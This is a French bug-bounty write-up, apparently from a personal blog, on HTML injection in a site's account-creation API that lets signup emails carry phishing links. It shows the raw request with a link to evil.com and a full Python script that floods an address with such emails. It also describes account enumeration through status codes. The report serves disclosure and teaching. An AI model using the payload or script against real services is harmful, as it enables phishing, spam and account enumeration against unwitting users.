---
published: true
layout: post
title: "Bug Bounty : De hacker à phisher"
description: "Cet article décrit comment une injection de caractères permet de créer un scénario de phishing dans le cadre d'un BugBounty"
lang: fr_FR
category: Bug Bounty, injection, phishing
---
![Bug Bounty : De hacker à phisher](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/illustration.jpg)

Dans ce court article, j'expliquerai comment j'ai pu exploiter une vulnérabilité de l'API d'un grand site français pour en faire un scénario de phishing. Je précise bien évidemment que tout a été fait dans la légalité car le site en question est inscrit sur une plateforme de Bug Bounty et j'ai été invité à ce Bug Bounty privé.

## Injection de caractères spéciaux via l'interface
Je me suis interessé à l'interface de création de compte du site en question, je me suis rendu compte que lors de l'inscription, un mail est envoyé avec le prénom de la personne qui s'est inscrite. J'ai alors essayé d'injecter des caractères spéciaux. Il ne m'a pas été possible d'injecter des caractères via l'interface :
[![Injection de caractères](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/interface.jpg)](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/interface.jpg)

## Injection de caractères spéciaux via l'API
Je me suis alors penché sur l'API et j'ai regardé les requêtes qui sont envoyées. J'ai tout d'abord envoyé des informations valides. L'API envoie alors un mail sur l'adresse indiquée avec un lien de validation et retourne le code `200`.
Si l'adresse existe déjà, aucun mail n'est envoyé et le code de retour est le `409`.

Grâce à cette information, il est déjà possible de faire un script d'énumération de comptes. J'ai également signalé cette vulnérabilité aux créateurs du site.

J'ai ensuite injecté dans le champ `firstName`les caractères souhaités via l'API :
```
POST /api/accounts?callback=https%3A//www.xxx.xxxx/espaceclient/managecustomer/accountcreationcallbackurl%3FloginHint%3Dbugbounty@yopmail.com&send_notif_email=true&is_migrated=false HTTP/1.1
Host: connect.xxxx.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: fr
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-App: CCL
Content-Length: 224
Origin: https://www.xxx.xxxx
DNT: 1
Connection: close

{
  "email":"bugbounty1234@yopmail.com",
  "password":"Toto123!",
  "firstName":"<a href=\"http://evil.com\">Merci de payer le billet",
  "lastName":"Bounty",
  "civility":"M",
  "birthdate":"1998-1-1",
  "mobileNumber":"+33677889988"
}
```

Le code d'erreur `200` est renvoyé, ce qui signifie que la requête a correctement été interprétée :
```
HTTP/1.1 200 OK
date: Sun, 01 Nov 2020 21:26:40 GMT
set-cookie: SFCP61API=SFCSERP61API; path=/
strict-transport-security: max-age=15768000
access-control-allow-origin: *
access-control-max-age: 1000
access-control-allow-headers: X-App, X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token, Accept-Encoding, X-OpenAM-Username, X-OpenAM-Password
access-control-allow-methods: POST, GET, PUT, DELETE
content-length: 0
x-cdn-srv: ovh-sbg-cache-1
connection: close
```

Le mail reçu est alors le suivant :
[![Mail d'inscription](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/mail.jpg)](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/mail.jpg)

Si l'utilisateur clique sur `Merci de payer le billet`, il sera redirigé vers le site http://evil.com

## Créer ou migrer pour exploiter ?
J'ai ensuite regardé les paramètres de la requête et notamment le paramètre `is_migrated=false`. J'ai rejoué la même requête mais en mettant la valeur à `is_migrated=true`. Le mail reçu a alors cette forme :
[![Mail de migration](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/mail2.jpg)](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/mail2.jpg)

Le système de mail considère que le compte existe déjà et choisi un autre template de mail. J'ai essayé de jouer avec ce paramètre pour voir la réaction du système sur un compte qui existe déjà, l'API vérifie correctement et il n'est pas possible d'envoyer le mail sur un compte existant.

## Script d'exploitation
Afin de réaliser une jolie preuve de concept en vidéo, j'ai créé un script Python qui m'a permis d'exploiter cette vulnérabilité. Le script est capable de :
- Injecter un lien malveillant dans le mail
- Choisir le nombre de mails à envoyer (pour spammer)
- Lister les comptes qui existent déjà

Pour les besoins du POC, j'ai séparé la fonctionnalité de listing des comptes dans un autre script que je ne présenterai pas ici, mais visiblement cela n'a pas intéressé l'entreprise en question.

```python
# -*- coding: utf-8 -*-
import requests, argparse

print("""
 ██████╗██╗     ███████╗██████╗ ███████╗██████╗
██╔════╝██║     ██╔════╝██╔══██╗██╔════╝██╔══██╗
██║     ██║     █████╗  ██████╔╝█████╗  ██████╔╝
██║     ██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗
╚██████╗███████╗███████╗██████╔╝███████╗██║  ██║
 ╚═════╝╚══════╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝
30/04/2020
API account spammer
Créé par Clément BOUDER pour le Bug Bounty YesWeHack
Ceci est un PoC merci de ne pas l'utiliser de manière malveillante
Mon site : https://clement-bouder.fr
""")

parser = argparse.ArgumentParser()
parser.add_argument("mail", help="L'adresse mail du mail a spammer",type=str)
parser.add_argument("nombre", help="L'adresse mail du mail a spammer", type=int)
parser.add_argument("texte", help="Le texte à envoyer",type=str)
args = parser.parse_args()
nombre_de_mail = args.nombre
mail_a_spammer = args.mail
texte = args.texte
print("Début du spam")
avancement = 0
for i in range(nombre_de_mail):

    url_api = "https://connect.xxxx.com:443/api/accounts?callback=https%3A//www.xxx.xxxx/espaceclient/managecustomer/accountcreationcallbackurl%3FloginHint%3D" + mail_a_spammer + "&send_notif_email=false&is_migrated=true"

    entete_requete = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "application/json", "Accept-Language": "fr", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "X-App": "CCL", "Origin": "https://www.xxx.xxxx", "DNT": "1", "Connection": "close", "Referer": "https://www.xxx.xxxx/"}

    donnees_requete={"birthdate": "2000-1-1", "civility": "M", "email": mail_a_spammer, "firstName": texte, "lastName": "xxxx pour un Bug Bounty", "mobileNumber": "+33689564313", "password": "unMotDePass!1"}

    result = requests.post(url_api, headers=entete_requete, json=donnees_requete)


    if result.status_code == 409:
        print("Compte déjà existant, impossible de spammer")
        exit()
    elif result.status_code != 200:
        print("Erreur inconnue : " + str(result.status_code) + str(result.text))
        exit()
    avancement = ((i*100)/nombre_de_mail)
    print("Avancement : " + str(avancement) + "%")
print("Avancement : 100%")
print(str(nombre_de_mail) + " mails envoyés")
```

Le rendu est alors le suivant :

[![Script d'exploitation](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/script.jpg)](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/script.jpg)

## Conclusion
Je n'ai pas pu aller plus loin dans l'exploitation de la vulnérabilité. J'ai donc écrit mon rapport et fait ma vidéo de preuve de concept avec un score CVSS de 5.4. Elle a été acceptée mais non payée car déjà déclarée :

[![Réponse sur YesWeHack](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/ywh_reponse.jpg)](/assets/images/2020-11-02-Bug-Bounty-de-hacker-a-fisher/ywh_reponse.jpg)

Pour conclure, pensez bien à ne **jamais** faire **confiance à ce qu'entre l'utilisateur** et **toujours nettoyer les entrées utilisateur**.
